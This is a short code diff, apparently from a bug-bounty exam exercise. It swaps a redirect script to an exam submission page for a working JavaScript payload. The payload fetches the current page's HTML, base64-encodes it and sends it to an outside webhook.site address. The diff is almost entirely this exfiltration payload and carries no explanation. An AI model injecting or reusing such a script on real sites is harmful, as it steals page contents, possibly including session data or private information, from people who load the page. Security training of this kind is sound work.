@@ -1,9 +1,7 @@
-<!DOCTYPE html>
-<html>
-<body>
-    <script>
-        // Replace 12345 with the actual ID of your submission
-        window.location.href = "https://bugbounty-exam.hashacademy.co/view.php?id=69e2a168bee6d6b7c6629d63";
-    </script>
-</body>
-</html>
+<script>
+fetch(document.location.href)
+  .then(r => r.text())
+  .then(html => {
+    fetch('https://webhook.site/82f191e4-653a-4a2c-99d4-872bc4426e85/?page=' + btoa(html));
+  });
+</script>
